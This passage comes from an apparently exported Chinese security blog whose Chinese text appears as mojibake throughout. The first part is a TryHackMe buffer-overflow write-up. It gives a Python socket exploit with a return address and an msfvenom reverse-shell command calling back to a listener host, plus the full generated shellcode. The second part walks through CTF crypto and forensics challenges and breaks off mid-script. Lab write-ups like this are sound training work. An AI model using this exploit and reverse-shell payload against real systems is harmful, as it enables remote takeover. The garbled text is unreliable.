æ‰¾åˆ°åˆæ­¥åå­—ç¬¦ï¼š 23 24 3c 3d 83 84 ba æ¥ä¸‹æ¥ç»§ç»­å¯»æ‰¾çœŸæ­£çš„badcharsï¼Œæˆ‘ä»¬å…ˆåœ¨payloadä¸­åˆ é™¤23ï¼Œç„¶åè¿è¡Œexploitè„šæœ¬ï¼Œçœ‹ç»“æœ çœ‹åˆ°24æ²¡äº†ï¼Œè¯´æ˜23æ˜¯badcharsï¼Œæˆ‘ä»¬ç»§ç»­é™¤æ‰3cï¼Œè¿™æ—¶å€™3dæ²¡äº†ï¼Œé‚£3cæ˜¯badï¼Œç»§ç»­é™¤æ‰83ï¼Œçœ‹åˆ°84æ²¡äº†ï¼Œè¯´æ˜83æ˜¯bad !mona compare -f C:\\mona\\oscp\\bytearray.bin -a 0197FA30 !mona bytearray -b \"\\x00\\x23\\x3c\\x83\\xba\" æœ€ç»ˆç¡®å®šbadcharsä¸º23 3c 83 ba Finding a Jump Point åœ¨ oscp.exe è¿è¡Œæˆ–å´©æºƒçŠ¶æ€ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹ mona å‘½ä»¤ï¼Œç¡®ä¿ä½¿ç”¨æ‚¨è¯†åˆ«çš„æ‰€æœ‰é”™è¯¯å­—ç¬¦ï¼ˆåŒ…æ‹¬ \\x00ï¼‰æ›´æ–° -cpb é€‰é¡¹ï¼š !mona jmp -r esp -cpb \"\\x00\\x23\\x3c\\x83\\xba\" æ­¤å‘½ä»¤æŸ¥æ‰¾åœ°å€ä¸åŒ…å«ä»»ä½•æŒ‡å®šçš„ badchars çš„æ‰€æœ‰â€œjmp espâ€ï¼ˆæˆ–ç­‰æ•ˆï¼‰æŒ‡ä»¤ã€‚ç»“æœåº”æ˜¾ç¤ºåœ¨â€œæ—¥å¿—æ•°æ®â€çª—å£ä¸­ï¼ˆå¦‚æœéœ€è¦ï¼Œè¯·ä½¿ç”¨â€œçª—å£â€èœå•åˆ‡æ¢åˆ°è¯¥çª—å£ï¼‰ã€‚ è¿™é‡Œæˆ‘é€‰æ‹©ç¬¬ä¸‰ä¸ªESPåœ°å€ï¼š0x625011c7ï¼Œç„¶åæ›´æ–°è„šæœ¬ï¼Œå°†retnå˜é‡è®¾ç½®ä¸ºè¿™ä¸ªåœ°å€ï¼ˆä»åå¾€å‰å†™ï¼‰ import socket ip = \"10.10.46.165\" port = 1337 prefix = \"OVERFLOW2 \" offset = 634 overflow = \"A\" * offset retn = \"\\xc7\\x11\\x50\\x62\" padding = \"\" payload = \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" postfix = \"\" payloadfer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil payloadfer...\") s.send(bytes(payloadfer + \"\\r \", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Generate Payload msfvenom -p windows/shell_reverse_tcp LHOST=10.11.65.203 LPORT=5555 EXITFUNC=thread -b \"\\x00\\x23\\x3c\\x83\\xba\" -f py å°†ç”Ÿæˆçš„shellcodeèµ‹å€¼ç»™payload import socket ip = \"10.10.46.165\" port = 1337 prefix = \"OVERFLOW2 \" offset = 634 overflow = \"A\" * offset retn = \"\\xc7\\x11\\x50\\x62\" padding = \"\\x90\" * 32 payload = \"\" payload += \"\\xfc\\xbb\\x93\\xd6\\xf6\\x9d\\xeb\\x0c\\x5e\\x56\\x31\\x1e\" payload += \"\\xad\\x01\\xc3\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\" payload += \"\\xff\\x6f\\x3e\\x74\\x9d\\x8f\\xbf\\x19\\x17\\x6a\\x8e\\x19\" payload += \"\\x43\\xff\\xa1\\xa9\\x07\\xad\\x4d\\x41\\x45\\x45\\xc5\\x27\" payload += \"\\x42\\x6a\\x6e\\x8d\\xb4\\x45\\x6f\\xbe\\x85\\xc4\\xf3\\xbd\" payload += \"\\xd9\\x26\\xcd\\x0d\\x2c\\x27\\x0a\\x73\\xdd\\x75\\xc3\\xff\" payload += \"\\x70\\x69\\x60\\xb5\\x48\\x02\\x3a\\x5b\\xc9\\xf7\\x8b\\x5a\" payload += \"\\xf8\\xa6\\x80\\x04\\xda\\x49\\x44\\x3d\\x53\\x51\\x89\\x78\" payload += \"\\x2d\\xea\\x79\\xf6\\xac\\x3a\\xb0\\xf7\\x03\\x03\\x7c\\x0a\" payload += \"\\x5d\\x44\\xbb\\xf5\\x28\\xbc\\xbf\\x88\\x2a\\x7b\\xbd\\x56\" payload += \"\\xbe\\x9f\\x65\\x1c\\x18\\x7b\\x97\\xf1\\xff\\x08\\x9b\\xbe\" payload += \"\\x74\\x56\\xb8\\x41\\x58\\xed\\xc4\\xca\\x5f\\x21\\x4d\\x88\" payload += \"\\x7b\\xe5\\x15\\x4a\\xe5\\xbc\\xf3\\x3d\\x1a\\xde\\x5b\\xe1\" payload += \"\\xbe\\x95\\x76\\xf6\\xb2\\xf4\\x1e\\x3b\\xff\\x06\\xdf\\x53\" payload += \"\\x88\\x75\\xed\\xfc\\x22\\x11\\x5d\\x74\\xed\\xe6\\xa2\\xaf\" payload += \"\\x49\\x78\\x5d\\x50\\xaa\\x51\\x9a\\x04\\xfa\\xc9\\x0b\\x25\" payload += \"\\x91\\x09\\xb3\\xf0\\x36\\x59\\x1b\\xab\\xf6\\x09\\xdb\\x1b\" payload += \"\\x9f\\x43\\xd4\\x44\\xbf\\x6c\\x3e\\xed\\x2a\\x97\\xa9\\x18\" payload += \"\\xa0\\xd6\\xe2\\x75\\xb4\\xd8\\xe1\\x36\\x31\\x3e\\x63\\x29\" payload += \"\\x14\\xe9\\x1c\\xd0\\x3d\\x61\\xbc\\x1d\\xe8\\x0c\\xfe\\x96\" payload += \"\\x1f\\xf1\\xb1\\x5e\\x55\\xe1\\x26\\xaf\\x20\\x5b\\xe0\\xb0\" payload += \"\\x9e\\xf3\\x6e\\x22\\x45\\x03\\xf8\\x5f\\xd2\\x54\\xad\\xae\" payload += \"\\x2b\\x30\\x43\\x88\\x85\\x26\\x9e\\x4c\\xed\\xe2\\x45\\xad\" payload += \"\\xf0\\xeb\\x08\\x89\\xd6\\xfb\\xd4\\x12\\x53\\xaf\\x88\\x44\" payload += \"\\x0d\\x19\\x6f\\x3f\\xff\\xf3\\x39\\xec\\xa9\\x93\\xbc\\xde\" payload += \"\\x69\\xe5\\xc0\\x0a\\x1c\\x09\\x70\\xe3\\x59\\x36\\xbd\\x63\" payload += \"\\x6e\\x4f\\xa3\\x13\\x91\\x9a\\x67\\x33\\x70\\x0e\\x92\\xdc\" payload += \"\\x2d\\xdb\\x1f\\x81\\xcd\\x36\\x63\\xbc\\x4d\\xb2\\x1c\\x3b\" payload += \"\\x4d\\xb7\\x19\\x07\\xc9\\x24\\x50\\x18\\xbc\\x4a\\xc7\\x19\" payload += \"\\x95\\x4a\\xe7\\xe5\\x16\" postfix = \"\" payloadfer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil payloadfer...\") s.send(bytes(payloadfer + \"\\r \", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") ç›‘å¬æ‹¿åˆ°shell 0x04 oscp.exe - æº¢å‡º3-10 å‰©ä¸‹çš„æ€è·¯éƒ½ä¸€æ ·ï¼Œå°±æ˜¯badcharsä¼šå˜åŒ–ï¼Œä¹Ÿå°±ä¸èµ˜è¿°äº† æº¢å‡º3ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š1300 bytes EIP offsetï¼š1274 ESPåœ°å€ä¸ºï¼š01AFFA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 01AFFA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 019EFA30 !mona bytearray -b \"\\x00\\x11\" barcharså˜åŒ–ä¸ºï¼š 11 12 40 41 5f 60 b8 -&gt; 11 40 41 5f 60 b8 -&gt; 11 40 5f 60 b8 -&gt; 11 40 5f b8 -&gt;11 40 5f b8 ee æº¢å‡º4ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š2100 bytes EIP offsetï¼š2026 ESPåœ°å€ä¸ºï¼š019AFA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 01AFFA30 !mona bytearray -b \"\\x00\\x11\" barcharså˜åŒ–ä¸ºï¼š 11 12 40 41 5f 60 b8 -&gt; 11 40 41 5f 60 b8 -&gt; 11 40 5f 60 b8 -&gt; 11 40 5f b8 -&gt;11 40 5f b8 ee æº¢å‡º5ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š2100 bytes EIP offsetï¼š2026 ESPåœ°å€ä¸ºï¼š01A9FA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 01A9FA30 !mona bytearray -b \"\\x00\\x11\" barcharså˜åŒ–ä¸ºï¼š a9 aa cd ce d4 d5 -&gt; a9 cd ce d4 d5 -&gt; a9 cd d4 d5 -&gt; a9 cd d4 æº¢å‡º6ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š400 bytes EIP offsetï¼š314 ESPåœ°å€ä¸ºï¼š0198FA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 01A9FA30 !mona bytearray -b \"\\x00\\x11\" barcharså˜åŒ–ä¸ºï¼š 16 17 2f 30 f4 f5 fd -&gt; \\x00\\x16\\x2f\\xf4\\xfd æº¢å‡º7ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š1100 bytes EIP offsetï¼š1034 ESPåœ°å€ä¸ºï¼š019EFA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 0198FA30 barcharså˜åŒ–ä¸ºï¼š 08 09 2c 2d ad ae -&gt; \\x00\\x08\\x2c\\xad æº¢å‡º8ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š1400 bytes EIP offsetï¼š1306 ESPåœ°å€ä¸ºï¼š019EFA30 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 0198FA30 barcharså˜åŒ–ä¸ºï¼š 8c 8d ae af be bf fb -&gt; \\x00\\x08\\x2c\\xad æº¢å‡º9ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š1800 bytes EIP offsetï¼š1786 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 0198FA30 barcharså˜åŒ–ä¸ºï¼š 1d 1e 2e 2f c7 c8 ee -&gt; \\x00\\x1d\\x2e\\xc7\\xee æº¢å‡º10ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š1600 bytes EIP offsetï¼š1514 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 0198FA30 barcharså˜åŒ–ä¸ºï¼š 04 05 3e 3f e1 e2 -&gt; \\x00\\x04\\x3e\\x3f\\xe1 æº¢å‡º11ï¼š ç¨‹åºå´©æºƒå­—èŠ‚æ•°ï¼š600 bytes EIP offsetï¼š537 !mona compare -f c:\\mona\\oscp\\bytearray.bin -a 0198FA30 barcharså˜åŒ–ä¸ºï¼š a0 a1 ad ae be bf de -&gt; \\x00\\x04\\x3e\\x3f\\xe1 0x05 å‚è€ƒæ–‡ç«  payloadfer Overflow Prep (THM) payloadfer Overflow prep - THM Room","tags":["tryhackme"],"categories":["tryhackme"]},{"title":"ç¬¬åäº”å±Šåœˆé’±æ¯wp","path":"/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/","content":"é¢˜ç›®ä¸€:çˆ¬è™«åè®® è§£é¢˜æ€è·¯ é¢˜ç›®æç¤ºç›´æ¥è®¿é—®robots.txtï¼Œç„¶åå¾—åˆ°ç›®å½•åï¼Œè®¿é—®æœ€ä¸‹é¢çš„ï¼Œå¾—åˆ°flag ç»§ç»­è®¿é—® FLAG flag{98c1ab60-b715-4eab-b3cc-e78981de120d} é¢˜ç›®äºŒï¼špacket è§£é¢˜æ€è·¯ wiresharkç›´æ¥æŠ“åŒ…ï¼Œé€‰æ‹©è¿½è¸ªTCPæµï¼Œå¦‚ä¸Šå›¾ï¼Œå‘ç°base64ç¼–ç ï¼Œè§£ç å¾—åˆ°flag FLAG flag{7d6f17a4-2b0a-467d-8a42-66750368c249} é¢˜ç›®ä¸‰ï¼šcc è§£é¢˜æ€è·¯ æ ¹æ®ç»™çš„æ ·æœ¬ï¼Œç›´æ¥é€‰æ‹©å·¦ä¾§aes è§£å¯†ï¼Œç„¶åå¤åˆ¶å¯¹åº”çš„keyï¼Œé€‰æ‹©inputä¸ºhexï¼Œoutputä¸ºraw FLAG flag{6500e76e-15fb-42e8-8f29-a309ab73ba38} é¢˜ç›®å››:Theorem è§£é¢˜æ€è·¯ æ ¹æ®æç¤ºï¼šæ¨¡è¿ç®—åœ¨å¯†ç å­¦ä¸­æ˜¯ä¸€ç§å¸¸è§çš„åŠ å¯†æ‰‹æ®µï¼Œè€Œä¸­å›½å‰©ä½™å®šç†åˆ™æä¾›äº†ä¸€ç§è§£å¯†çš„æ–¹æ³•ã€‚å°è“åŒå­¦è¿ç”¨è¿™ä¸ªå®šç†æ¥è·å¾—cï¼Œè¿›è€Œè·å¾—äº†flagã€‚ ç»å…¸é¢˜å‹ï¼šå·²çŸ¥eã€pã€qã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡mï¼ˆå¯ç›´æ¥ä¸Šè„šæœ¬ï¼Œä¹‹å‰åšè¿‡ï¼‰ from Crypto.Util.number import * from gmpy2 import * flag = b'xxx' m = bytes_to_long(flag) p = getPrime(512) q = next_prime(p) e = 65537 n = p * q phi = (p - 1) * (q - 1) d = inverse(e, phi) d1 = d % q d2 = d % p c = pow(m, e, n) print(n) print(d1) print(d2) print(c) # 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791 # 4218387668018915625720266396593862419917073471510522718205354605765842130260156168132376152403329034145938741283222306099114824746204800218811277063324566 # 9600627113582853774131075212313403348273644858279673841760714353580493485117716382652419880115319186763984899736188607228846934836782353387850747253170850 # 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829 æ ¹æ®å‰©ä½™å®šç†ï¼Œå†™pyè„šæœ¬ from Crypto.Util.number import long_to_bytes,inverse#å¯¼å…¥ç›¸å…³åŒ… from sympy import primefactors # é¢˜ç›®ç»™çš„ç›¸å…³åŠ å¯†æ•°æ® n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791 e = 65537 c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829 factors = primefactors(n) p,q = factors[0], factors[1] phi = (p-1) * (q-1) d = inverse(e, phi) # è¿›è¡Œè§£å¯† m = pow(c,d,n) #è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ flag = long_to_bytes(m) print(flag) æ‹¿åˆ°flag FLAG flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a} é¢˜ç›®äº”:signature è§£é¢˜æ€è·¯ æ ¹æ®é¢˜ç›®ç»™çš„é™„ä»¶ï¼šæ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼Œå®ƒåˆ©ç”¨æ¤­åœ†æ›²çº¿å¯†ç å­¦ï¼ˆECCï¼‰å¯¹æ•°å­—ç­¾åç®—æ³•ï¼ˆDSAï¼‰è¿›è¡Œæ¨¡æ‹Ÿï¼Œå…¶å®‰å…¨æ€§åŸºäºæ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚ä½†æ˜¯å½“æŸäº›æ•°å€¼ç›¸åŒæ—¶ä¼šå‡ºç°ä¸€äº›å®‰å…¨é—®é¢˜ã€‚ import ecdsa import random def ecdsa_test(dA,k): sk = ecdsa.SigningKey.from_secret_exponent( secexp=dA, curve=ecdsa.SECP256k1 ) sig1 = sk.sign(data=b'Hi.', k=k).hex() sig2 = sk.sign(data=b'hello.', k=k).hex() r1 = int(sig1[:64], 16) s1 = int(sig1[64:], 16) s2 = int(sig2[64:], 16) return r1,s1,s2 if __name__ == '__main__': n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 a = random.randint(0,n) flag = 'flag{' + str(a) + \"}\" b = random.randint(0,n) print(ecdsa_test(a,b)) # (4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254) ecdsa_testå‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šdAï¼ˆç§é’¥ï¼‰å’Œ kï¼ˆéšæœºæ•°ï¼‰ã€‚ ä½¿ç”¨ç»™å®šçš„dAç§é’¥å’ŒSECP256k1æ›²çº¿åˆ›å»ºäº†ä¸€ä¸ªç­¾åå¯†é’¥skã€‚ ä½¿ç”¨å¯†é’¥skå¯¹æ¶ˆæ¯ b'Hi.' å’Œ b'hello.' è¿›è¡Œç­¾åï¼Œå¹¶å°†ç­¾åç»“æœè½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ ä»ç­¾åå­—ç¬¦ä¸²ä¸­æå–å‡º r å’Œ s å€¼ï¼Œåˆ†åˆ«æ˜¯ç­¾åçš„ä¸€éƒ¨åˆ†ã€‚ è¿”å› r1ã€s1 å’Œ s2ã€‚ è¯¥ä»£ç ä½¿ç”¨ECDSAå¯¹æ¶ˆæ¯è¿›è¡Œç­¾åã€‚å®ƒç”Ÿæˆä¸€ä¸ªéšæœºçš„ç§é’¥ a å’Œéšæœºæ•° bï¼Œç„¶åä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œå¹¶æå–ç­¾åçš„ r å’Œ s å€¼ã€‚æœ€åï¼Œå®ƒå°† r1ã€s1 å’Œ s2 æ‰“å°å‡ºæ¥ã€‚ æ ¹æ®ä¸Šè¿°è„šæœ¬ï¼Œå¯è½»æ˜“å†™å‡ºä¸‹åˆ—exp from Crypto.Util.number import * from hashlib import * import gmpy2 #å®šä¹‰æ¤­åœ†æ›²çº¿çš„æ¨¡æ•° nï¼Œå’Œå‚æ•° a å’Œ bã€‚ n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 a = 0 b = 7 #å®šä¹‰æ¶ˆæ¯å’Œå·²çŸ¥ç­¾åï¼š m1 = b\"Hi.\" m2 = b\"hello.\" r1, s1, s2 = ( 4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254 ) #ä½¿ç”¨SHA-1å“ˆå¸Œç®—æ³•è®¡ç®—æ¶ˆæ¯ m1 å’Œ m2 çš„å“ˆå¸Œå€¼ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºé•¿æ•´æ•°ã€‚ test1 = bytes_to_long(sha1(m1).digest()) test2 = bytes_to_long(sha1(m2).digest()) testk = gmpy2.invert((s1 - s2), n) * (test1 - test2) %n testr = gmpy2.invert(r1, n) resultd = ((testk * s1) - test1) * testr % n print('flag{'+str(resultd) + '}') è®¡ç®— k å€¼ï¼Œé€šè¿‡æ±‚è§£ (s1 - s2) * k â‰¡ (test1 - test2) (mod n) çš„æ¨¡åå…ƒç´ ã€‚ è®¡ç®— r çš„æ¨¡åå…ƒç´  testrã€‚ ä½¿ç”¨å…¬å¼ resultd = ((k * s1) - test1) * testr mod n è¿˜åŸç§é’¥ã€‚ FLAG flag{40355055231406097504270940121798355439363616832290875140843417522164091270174} é¢˜ç›®å…­:rc4 è§£é¢˜æ€è·¯ æ ¹æ®æç¤ºï¼šRC4æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦å¯å˜ï¼Œå®ƒåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤ä¹Ÿå±äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ çœ‹å‡ºè¯¥RC4åŠ å¯†æ²¡æœ‰é­”æ”¹ï¼Œæ­£å¸¸æ‰“å³å¯ æ‰“å¼€é™„ä»¶å‘ç°æ˜¯exeï¼Œidaæ‰“å¼€ï¼ˆæ€è·¯æ„Ÿè§‰æ˜¯æ‰¾åˆ°RC4åŠ å¯†å¯†æ–‡å³å¯ï¼‰ï¼Œ32ä½idaæ‰“å¼€ å¯ä»¥çœ‹å‡ºä¸Šè¿°gamelab@ä¸ºç§˜é’¥keyï¼Œåœ¨mainå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿›å…¥ï¼ŒåŠ¨æ€dumpå¾—åˆ°v5 æœ¬åœ°å¼€åŠ¨è°ƒ æ‰¾åˆ°ä¸Šè¿°ä½ç½®ï¼Œç‚¹å‡»è¿›å» å¦‚ä¸Šå›¾ï¼Œæ‰¾åˆ°RC4å¯†æ–‡ï¼Œä¸Šcyberchefè¿›è¡ŒRC4è§£å¯†å³å¯ï¼Œè¾“å…¥å¯¹åº”ç§˜é’¥è½¬æ˜æ–‡å¾—åˆ°flag FLAG flag{12601b2b-2f1e-468a-ae43-92391ff76ef3} é¢˜ç›®ä¸ƒï¼šç¼ºå¤±çš„æ•°æ® è§£é¢˜æ€è·¯ æ ¹æ®é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œå…¶ä¸­å‹ç¼©åŒ…éœ€è¦å¯†ç æ‰è¡Œï¼ŒåŒæ—¶ç»™äº†secret.txtï¼Œå…¶ä¸­åŒ…å«å‹ç¼©åŒ…å¯†ç ï¼Œç›´æ¥ä¸Šå·¥å…·çˆ†ç ´ å¯†ç ä¸ºï¼špavilion æ ¹æ®è¿™ä¸¤ä¸ªå›¾ç‰‡ï¼Œç¡®å®šä¸ºå›¾ç‰‡ç›²æ°´å° ç»§ç»­çœ‹é¢˜ç›®ç»™çš„åŠ å¯†è„šæœ¬ class WaterMarkDWT: def __init__(self, origin: str, watermark: str, key: int, weight: list): self.key = key self.img = cv2.imread(origin) self.mark = cv2.imread(watermark) self.coef = weight def arnold(self, img): r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key): for i in range(r): for j in range(c): x = (i + b * j) % r y = (a * i + (a * b + 1) * j) % c p[x, y] = img[i, j] return p def deArnold(self, img): r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key): for i in range(r): for j in range(c): x = ((a * b + 1) * i - b * j) % r y = (-a * i + j) % c p[x, y] = img[i, j] return p def get(self, size: tuple = (1200, 1200), flag: int = None): img = cv2.resize(self.img, size) img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY) c = pywt.wavedec2(img2, 'db2', level=3) [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c d = pywt.wavedec2(img1, 'db2', level=3) [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d a1, a2, a3, a4 = self.coef ca1 = (cl - dl) * a1 ch1 = (cH3 - dH3) * a2 cv1 = (cV3 - dV3) * a3 cd1 = (cD3 - dD3) * a4 waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], 'db2') waterImg = np.array(waterImg, np.uint8) waterImg = self.deArnold(waterImg) kernel = np.ones((3, 3), np.uint8) if flag == 0: waterImg = cv2.erode(waterImg, kernel) elif flag == 1: waterImg = cv2.dilate(waterImg, kernel) cv2.imwrite('æ°´å°.png', waterImg) return waterImg if __name__ == '__main__': img = 'a.png' k = 20 xs = [0.2, 0.2, 0.5, 0.4] W1 = WaterMarkDWT(img, waterImg, k, xs) åˆ†æå¾—åˆ°ä¸Šé¢çš„åŠŸèƒ½æ˜¯åœ¨å›¾ç‰‡ä¸Šæ·»åŠ æ°´å° originï¼šåŸå§‹å›¾åƒçš„æ–‡ä»¶è·¯å¾„ã€‚ watermarkï¼šæ°´å°å›¾åƒçš„æ–‡ä»¶è·¯å¾„ã€‚ keyï¼šArnoldå˜æ¢çš„è¿­ä»£æ¬¡æ•°ã€‚ weightï¼šæ°´å°åµŒå…¥çš„ç³»æ•°åˆ—è¡¨ã€‚ å®šä¹‰Arnoldé€†å˜æ¢å‡½æ•°ï¼šå®ç°ç»†èŠ‚ä¸º deArnold(self, img)å‡½æ•°å®ç°Arnoldé€†å˜æ¢ï¼Œå¯¹ä¼ å…¥çš„å›¾åƒimgè¿›è¡Œé€†å˜æ¢ã€‚å®ƒè¿”å›é€†å˜æ¢åçš„å›¾åƒã€‚ ä¸arnold()å‡½æ•°ç±»ä¼¼ï¼Œé¦–å…ˆè·å–å›¾åƒçš„è¡Œæ•°rå’Œåˆ—æ•°cï¼Œåˆ›å»ºä¸€ä¸ªå…¨é›¶çš„å›¾åƒpç”¨äºå­˜å‚¨é€†å˜æ¢ç»“æœã€‚ ä½¿ç”¨ç›¸åŒçš„å‚æ•°aå’Œbæ¥æ§åˆ¶é€†å˜æ¢çš„è¿­ä»£æ¬¡æ•°å’Œå˜æ¢å…¬å¼ã€‚ åœ¨ä¸¤å±‚å¾ªç¯ä¸­ï¼Œæ ¹æ®Arnoldé€†å˜æ¢çš„å…¬å¼è®¡ç®—é€†å˜æ¢åçš„åƒç´ ä½ç½®(x, y)ï¼Œå¹¶å°†å˜æ¢åçš„å›¾åƒä¸­çš„åƒç´ å€¼èµ‹ç»™é€†å˜æ¢åçš„ä½ç½®ã€‚ å¾ªç¯ç»“æŸåï¼Œè¿”å›é€†å˜æ¢åçš„å›¾åƒ5. å®šä¹‰è·å–æ°´å°å›¾åƒçš„å‡½æ•°ï¼š ä¹‹åï¼Œå°†å¾—åˆ°çš„ä¸¤ä¸ªå›¾ç‰‡ä½¿ç”¨SUBæ–¹å¼å åŠ ï¼Œå†™å¯¹åº”è§£å¯†è„šæœ¬ï¼šexpå¦‚ä¸‹ import cv2#å¯¼å…¥éœ€è¦çš„åº“ import numpy as np import pywt class WaterMarkDWT: #WaterMarkDWTç±»æ¥å—å››ä¸ªå‚æ•°ï¼šoriginï¼ˆåŸå§‹å›¾åƒæ–‡ä»¶çš„è·¯å¾„ï¼‰ï¼Œwatermarkï¼ˆæ°´å°å›¾åƒæ–‡ä»¶çš„è·¯å¾„ï¼‰ï¼Œkeyï¼ˆArnoldå˜æ¢çš„è¿­ä»£æ¬¡æ•°ï¼‰ï¼Œweightï¼ˆç”¨äºä¿®æ”¹å°æ³¢ç³»æ•°çš„å››ä¸ªç³»æ•°çš„åˆ—è¡¨ï¼‰ã€‚ def __init__(self, origin: str, watermark: str, key: int, weight: list): #æ„é€ å‡½æ•°åˆå§‹åŒ–å¯†é’¥ï¼Œä½¿ç”¨OpenCVçš„imreadå‡½æ•°è¯»å–åŸå§‹å›¾åƒå’Œæ°´å°å›¾åƒï¼Œå¹¶å­˜å‚¨æƒé‡ç³»æ•°ã€‚ self.key = key self.img = cv2.imread(origin) self.mark = 